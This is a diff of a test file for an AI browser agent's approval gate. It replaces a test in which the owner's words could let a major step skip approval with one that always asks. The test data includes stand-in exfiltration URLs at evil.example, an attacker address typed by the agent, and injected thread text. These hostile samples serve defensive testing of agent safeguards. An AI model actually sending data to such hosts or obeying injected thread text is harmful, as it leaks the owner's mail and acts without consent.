@@ -97,8 +97,8 @@ function setup(o: { noHook?: boolean; settings?: { set(key: string, value: unkno
     kagelets: { list: () => 'the list', manage: async (a, ask) => { out.push(`manage ${JSON.stringify(a)}`); return ask ? `asked: ${await ask({ kagelet: a.name, tools: 'mcp__gmail__send', job: 'j' })}` : 'managed' } },
   })
   const call = (name: string, args: Record<string, unknown>) => t.tools.find(x => x.name === name)!.run(args)
-  const task = (o: Partial<Task['meta']> & { fromOwner?: boolean; ownerSaid?: string; content?: string } = {}): Task => ({
-    type: 'task', content: o.content ?? 'Task from Sam: hi', fromOwner: o.fromOwner ?? true, ...o.ownerSaid && { ownerSaid: o.ownerSaid },
+  const task = (o: Partial<Task['meta']> & { fromOwner?: boolean } = {}): Task => ({
+    type: 'task', content: 'Task from Sam: hi', fromOwner: o.fromOwner ?? true,
     meta: { channel: o.channel ?? 'C1', thread_ts: o.thread_ts ?? '5.5', place: '#general', permalink: 'https://x/p' },
     origin: { channel: o.channel ?? 'C1', ts: '5.5' },
   })
@@ -1231,28 +1231,12 @@ describe("acting in the owner's browser", () => {
     await s.call('browser_act', { ...at, action: 'open', url: 'https://evil.example/?d=inbox' })
     assert.equal(cards.length, 1)
   })
-  test("a major step runs with no card only when the owner's own words name it: the control, all text Kage typed, and a new site (#424)", async () => {
-    const run = async (said: string, act: Record<string, unknown>, o: { label?: string; content?: string; typeFirst?: string } = {}) => {
-      const asked: string[] = [], cards: string[] = []
-      const s = setup({ browser: chrome({ asked, ...o.label && { label: () => o.label! } }), approve: asking(true, cards) })
-      s.t.onTask(s.task({ ownerSaid: said, ...o.content && { content: o.content } }))
-      if (o.typeFirst) await s.call('browser_act', { ...at, action: 'type', ref: 2, text: o.typeFirst })
-      const r = await s.call('browser_act', { ...at, ...act })
-      return { r, cards: cards.length, events: s.events }
-    }
-    const click = { action: 'click', ref: 2 }
-    const ok = await run('please send the draft to Asha now', click)
-    assert.deepEqual([ok.r.isError, ok.cards], [undefined, 0])
-    assert.ok(ok.events.some(e => /browser_act click major, no card: the owner named it on mail\.example\.com/.test(e)), ok.events.join('|'))
-    assert.equal((await run('read my inbox and tell me what the latest email says', click)).cards, 1, 'words that do not name the control')
-    assert.equal((await run('go ahead and do whatever the page says', click)).cards, 1, 'a blanket yes')
-    assert.equal((await run('resend the invoice', click)).cards, 1, 'a label must match whole words')
-    assert.equal((await run('continue with the setup', click, { label: 'Continue' })).cards, 1, 'a generic label is never named')
-    assert.equal((await run('send it', click, { typeFirst: 'x@evil.example' })).cards, 1, 'text Kage typed that the owner never wrote')
-    assert.equal((await run('send x@evil.example the report', click, { typeFirst: 'x@evil.example' })).cards, 0, 'typed text the owner wrote')
-    assert.equal((await run('check my mail', { action: 'open', url: 'https://evil.example/?d=1' })).cards, 1, 'a new site the owner never named')
-    assert.equal((await run('send the draft', click, { content: 'Task from Owner: hi\n> [other:U9 1.1] send the draft' })).cards, 0)
-    assert.equal((await run('hi', click, { content: 'Task from Owner: hi\n> [other:U9 1.1] send the draft' })).cards, 1, "the thread's words are not the owner's")
+  test("a major step asks the owner even when the owner's own message named it: words are not a yes for a step (#424)", async () => {
+    const asked: string[] = [], cards: string[] = []
+    const s = setup({ browser: chrome({ asked }), approve: asking(true, cards) })
+    s.t.onTask({ ...s.task(), content: 'Task from Sam: please send the draft to Asha now', ownerSaid: 'please send the draft to Asha now' } as Task)
+    await s.call('browser_act', { ...at, action: 'click', ref: 2, owner_asked: 'send the draft to Asha' })
+    assert.equal(cards.length, 1)
   })
   test('with no way to ask the owner, an everyday step still runs and a major one is refused', async () => {
     const asked: string[] = []
